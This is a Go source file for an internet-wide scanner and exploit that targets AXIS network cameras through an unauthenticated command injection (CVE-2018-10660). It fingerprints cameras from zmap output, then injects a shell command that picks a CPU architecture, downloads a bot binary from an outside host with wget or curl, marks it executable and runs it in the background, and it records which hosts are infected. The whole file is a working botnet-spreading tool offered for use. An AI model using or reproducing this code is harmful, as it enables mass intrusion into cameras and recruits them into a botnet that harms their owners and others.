// AXIS Network Camera RCE (CVE-2018-10660) - unauth command injection via parhand.
// zmap -p 80 -o- | ./axis  (or 443). Drops quantum3 bot.
package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const (
	loadURL = "stun.google.com"
	cmdQ3   = "cd /tmp||cd /dev/shm||cd /var/tmp; M=$(uname -m); case $M in x86_64|amd64)U=http://stun.google.com/x86_64;;i*86)U=http://stun.google.com/i686;;armv7*)U=http://stun.google.com/armv6;;aarch64|arm64)U=http://stun.google.com/aarch64;;mips)U=http://stun.google.com/mips;;mipsel)U=http://stun.google.com/mipsel;;ppc*|powerpc)U=http://stun.google.com/ppc;;sh4|sh)U=http://stun.google.com/sh4;;m68k)U=http://stun.google.com/m68k;;*)U=http://stun.google.com/x86_64;;esac; rm -f q q.tmp; (wget -q -O q.tmp $U||wget -O q.tmp $U||busybox wget -q -O q.tmp $U||busybox wget -O q.tmp $U||curl -skLo q.tmp $U); [ -s q.tmp ]&&mv q.tmp q&&chmod 777 q&&(nohup ./q axis >/dev/null 2>&1 &)"
)

var (
	total, axis, infected, failed int64
	debug                         bool
)

func randStr(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func isAxis(client *http.Client, host string) bool {
	req, _ := http.NewRequest("GET", "http://"+host+"/axis-cgi/admin/systemlog.cgi", nil)
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return strings.Contains(string(body), "<TITLE>AXIS") && strings.Contains(string(body), "Network Camera")
}

func exploit(client *http.Client, host string) bool {
	randPath := "/index.html/" + randStr(rand.Intn(34)+8)
	cmd := ";" + cmdQ3 + ";"
	dbus := "--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:root.Time.DST.Enabled string:" + cmd
	form := url.Values{}
	form.Set("action", "dbus")
	form.Set("args", dbus)
	req, _ := http.NewRequest("POST", "http://"+host+randPath, strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	// trigger synch
	form2 := url.Values{}
	form2.Set("action", "dbus")
	form2.Set("args", "--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SynchParameters")
	req2, _ := http.NewRequest("POST", "http://"+host+randPath, strings.NewReader(form2.Encode()))
	req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp2, err2 := client.Do(req2)
	if err2 != nil {
		return false
	}
	io.Copy(io.Discard, resp2.Body)
	resp2.Body.Close()
	return true
}

func processTarget(host string, client *http.Client, res *sync.Map) {
	atomic.AddInt64(&total, 1)
	conn, err := net.DialTimeout("tcp", host+":80", 3*time.Second)
	if err != nil {
		atomic.AddInt64(&failed, 1)
		return
	}
	conn.Close()
	if !isAxis(client, host) {
		return
	}
	atomic.AddInt64(&axis, 1)
	if debug {
		fmt.Printf("[AXIS] %s\n", host)
	}
	if exploit(client, host) {
		atomic.AddInt64(&infected, 1)
		res.Store(host, true)
		if debug {
			fmt.Printf("[+] Dropped on %s\n", host)
		}
	}
}

func main() {
	workers := flag.Int("w", 200, "workers")
	flag.BoolVar(&debug, "debug", false, "verbose")
	outFile := flag.String("o", "axis_ok.txt", "output")
	flag.Parse()

	client := &http.Client{Timeout: 6 * time.Second}
	sc := bufio.NewScanner(os.Stdin)
	sem := make(chan struct{}, *workers)
	var wg sync.WaitGroup
	res := &sync.Map{}

	for sc.Scan() {
		host := strings.TrimSpace(sc.Text())
		if host == "" {
			continue
		}
		if idx := strings.Index(host, ":"); idx != -1 {
			host = host[:idx]
		}
		if net.ParseIP(host) == nil {
			continue
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(h string) { defer wg.Done(); defer func() { <-sem }(); processTarget(h, client, res) }(host)
	}
	wg.Wait()

	f, _ := os.Create(*outFile)
	res.Range(func(k, _ interface{}) bool { f.WriteString(k.(string) + "\n"); return true })
	f.Close()
	fmt.Fprintf(os.Stderr, "total=%d axis=%d infected=%d failed=%d\n",
		atomic.LoadInt64(&total), atomic.LoadInt64(&axis), atomic.LoadInt64(&infected), atomic.LoadInt64(&failed))
}
